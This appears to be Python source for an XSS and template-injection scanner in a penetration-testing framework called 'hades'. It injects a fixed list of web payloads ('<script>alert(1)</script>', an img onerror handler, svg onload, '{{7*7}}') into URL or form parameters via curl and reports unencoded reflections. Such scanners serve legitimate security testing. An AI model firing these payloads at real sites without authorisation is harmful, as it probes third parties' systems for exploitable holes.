"""XSS Probe — smart XSS tester that sends payloads and checks for unencoded reflection."""

from __future__ import annotations

import asyncio
import html
import logging
import time
from typing import Any
from urllib.parse import parse_qs, quote, urlencode, urlparse, urlunparse

from tools.base import ToolDefinition, ToolParam, ToolResult, registry

logger = logging.getLogger("hades.tools.xss_probe")

_MAX_PARAMS = 5

PAYLOADS = [
    {"payload": "hades<>\"'xss", "check": "hades<>\"'xss", "name": "raw_reflection"},
    {"payload": "<script>alert(1)</script>", "check": "<script>alert(1)</script>", "name": "script_tag"},
    {"payload": "\"><img src=x onerror=alert(1)>", "check": "onerror=alert(1)", "name": "event_handler"},
    {"payload": "<svg/onload=alert(1)>", "check": "<svg/onload=alert(1)>", "name": "svg_onload"},
    {"payload": "{{7*7}}", "check": "49", "name": "template_injection"},
    {"payload": "\" autofocus onfocus=alert(1) x=\"", "check": "onfocus=alert(1)", "name": "attr_escape"},
]


class XssProbeTool(ToolDefinition):
    name = "xss_probe"
    binary = "curl"
    description = (
        "Quick XSS probe — tests parameters with reflection payloads "
        "and checks for unencoded output in responses"
    )
    category = "exploitation"
    risk = "medium"
    timeout = 90
    params = [
        ToolParam("url", "URL with parameter to test (e.g. https://target/search?q=test)", required=True),
        ToolParam("param", "Parameter name to test (e.g. 'q'). If empty, tests all query params"),
        ToolParam("method", "HTTP method", default="GET", choices=["GET", "POST"]),
        ToolParam("data", "POST body data template (e.g. 'search=INJECT')"),
        ToolParam("headers", "Extra headers as 'Key: Value', comma-separated"),
    ]

    async def run(self, target: str, params: dict[str, Any] | None = None) -> ToolResult:
        params = params or {}
        if not self.is_available():
            return ToolResult(
                tool=self.name, target=target, success=False,
                summary=f"{self.binary} not found in PATH",
                raw_output="", error=f"{self.binary} not installed",
            )

        url = params.get("url") or target
        method = params.get("method", "GET").upper()
        data_template = params.get("data")
        extra_headers = params.get("headers", "")
        param_filter = params.get("param", "")

        parsed = urlparse(url)
        query_params = parse_qs(parsed.query, keep_blank_values=True)

        # Determine which parameters to test
        if param_filter:
            test_params = [param_filter]
        elif method == "POST" and data_template:
            # Extract param names from POST body template like "search=INJECT&foo=bar"
            test_params = [k for k in parse_qs(data_template, keep_blank_values=True)]
        else:
            test_params = list(query_params.keys())

        if not test_params:
            return ToolResult(
                tool=self.name, target=target, success=False,
                summary="No parameters found to test. Provide a URL with query params or use 'param'.",
                raw_output="", error="no_params",
            )

        test_params = test_params[:_MAX_PARAMS]

        start = time.monotonic()
        findings: list[dict] = []
        table_rows: list[str] = []
        table_rows.append(f"{'Param':<15} {'Payload':<25} {'Reflected':<10} {'Encoded':<10} {'CSP':<5}")
        table_rows.append("-" * 70)

        csp_detected = None  # Will be set on first response

        for param_name in test_params:
            for entry in PAYLOADS:
                payload = entry["payload"]
                check = entry["check"]
                name = entry["name"]

                # Build the request URL
                test_url, curl_args = self._build_request(
                    parsed, query_params, param_name, payload,
                    method, data_template, extra_headers,
                )

                # Execute curl
                body, resp_headers = await self._curl(curl_args)
                if body is None:
                    table_rows.append(f"{param_name:<15} {name:<25} {'error':<10} {'-':<10} {'-':<5}")
                    continue

                # Check CSP
                csp = ""
                for hdr_line in resp_headers.splitlines():
                    lower = hdr_line.lower()
                    if lower.startswith("content-security-policy:"):
                        csp = hdr_line.split(":", 1)[1].strip()
                        break
                if csp_detected is None:
                    csp_detected = csp

                # Check Content-Type
                content_type = ""
                for hdr_line in resp_headers.splitlines():
                    lower = hdr_line.lower()
                    if lower.startswith("content-type:"):
                        content_type = hdr_line.split(":", 1)[1].strip()
                        break
                is_json = "application/json" in content_type.lower()

                # Check reflection
                reflected = check in body
                # Check if canary chars are encoded
                encoded = False
                if name == "raw_reflection" and not reflected:
                    encoded = (
                        html.escape(payload) in body
                        or "hades&lt;&gt;" in body
                        or "hades%3C%3E" in body
                    )

                has_csp = "Y" if csp else "N"
                table_rows.append(
                    f"{param_name:<15} {name:<25} {'YES' if reflected else 'no':<10} "
                    f"{'YES' if encoded else 'no':<10} {has_csp:<5}"
                )

                if not reflected:
                    if encoded and name == "raw_reflection":
                        findings.append({
                            "type": "encoded_reflection",
                            "severity": "info",
                            "parameter": param_name,
                            "payload": payload,
                            "evidence": "Input reflected but special characters are HTML-encoded",
                            "url": test_url,
                            "csp": csp or None,
                        })
                    continue

                # Determine finding type and severity
                if name == "template_injection":
                    finding_type = "ssti"
                    severity = "critical"
                else:
                    finding_type = "reflected_xss"
                    if csp:
                        severity = "medium"
                    else:
                        severity = "high"

                # Extract evidence snippet (200 chars around the match)
                idx = body.find(check)
                snippet_start = max(0, idx - 100)
                snippet_end = min(len(body), idx + len(check) + 100)
                evidence = body[snippet_start:snippet_end]

                note = ""
                if is_json:
                    note = " (response is application/json — may not be exploitable in browser)"
                    severity = "info" if finding_type == "reflected_xss" else severity

                findings.append({
                    "type": finding_type,
                    "severity": severity,
                    "parameter": param_name,
                    "payload": payload,
                    "evidence": evidence + note,
                    "url": test_url,
                    "csp": csp or None,
                })

        elapsed = time.monotonic() - start

        # Build summary
        confirmed = [f for f in findings if f["severity"] in ("critical", "high", "medium")]
        info_only = [f for f in findings if f["severity"] == "info"]

        if any(f["type"] == "ssti" for f in confirmed):
            summary = f"SSTI CONFIRMED on {target}"
        elif confirmed:
            summary = f"XSS FOUND — {len(confirmed)} confirmed reflection(s)"
        elif info_only:
            summary = f"No exploitable XSS — {len(info_only)} info-level finding(s) (encoded/JSON)"
        else:
            summary = "No XSS found — all payloads filtered or not reflected"

        summary += f"\nParams tested: {len(test_params)} | Payloads per param: {len(PAYLOADS)}"
        summary += f" | CSP: {'present' if csp_detected else 'absent'}"

        return ToolResult(
            tool=self.name,
            target=target,
            success=True,
            summary=summary,
            raw_output="\n".join(table_rows),
            findings=findings,
            duration=elapsed,
            exit_code=0,
        )

    def _build_request(
        self,
        parsed,
        query_params: dict,
        param_name: str,
        payload: str,
        method: str,
        data_template: str | None,
        extra_headers: str,
    ) -> tuple[str, list[str]]:
        """Build curl arguments for a single probe request."""
        encoded_payload = quote(payload)

        if method == "POST" and data_template:
            # Replace INJECT marker or the param value in POST body
            if "INJECT" in data_template:
                post_data = data_template.replace("INJECT", encoded_payload)
            else:
                post_body_params = parse_qs(data_template, keep_blank_values=True)
                post_body_params[param_name] = [payload]
                post_data = urlencode(post_body_params, doseq=True)

            test_url = urlunparse(parsed._replace(query=parsed.query))
            args = ["-sk", "--max-time", "10", "-X", "POST", "-d", post_data]
        else:
            # Inject payload into query string
            injected = dict(query_params)
            injected[param_name] = [payload]
            new_query = urlencode(injected, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            args = ["-sk", "--max-time", "10"]

        # Include response headers (dump to stderr via -D)
        args.extend(["-D", "-"])
        args.extend(["-o", "-"])

        # Extra headers
        if extra_headers:
            for h in extra_headers.split(","):
                h = h.strip()
                if h:
                    args.extend(["-H", h])

        args.append(test_url)
        return test_url, args

    async def _curl(self, args: list[str]) -> tuple[str | None, str]:
        """Run a single curl request. Returns (body, headers) or (None, '') on error."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "curl", *args,
                stdin=asyncio.subprocess.DEVNULL,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                start_new_session=True,
            )
            stdout_raw, stderr_raw = await asyncio.wait_for(
                proc.communicate(), timeout=15,
            )
        except asyncio.TimeoutError:
            try:
                proc.kill()
            except ProcessLookupError:
                pass
            return None, ""
        except Exception:
            return None, ""

        raw = stdout_raw.decode("utf-8", errors="replace")

        # -D - sends headers to stdout before body, separated by blank line
        # Split on first double newline to separate headers from body
        parts = raw.split("\r\n\r\n", 1)
        if len(parts) == 2:
            headers, body = parts
        else:
            parts = raw.split("\n\n", 1)
            if len(parts) == 2:
                headers, body = parts
            else:
                headers, body = "", raw

        return body, headers

    # Not used — run() handles everything
    def build_args(self, target: str, params: dict[str, Any]) -> list[str]:
        return []

    def parse_output(self, stdout: str, stderr: str, exit_code: int, target: str) -> ToolResult:
        return ToolResult(
            tool=self.name, target=target, success=True,
            summary="", raw_output=stdout, exit_code=exit_code,
        )


registry.register(XssProbeTool())
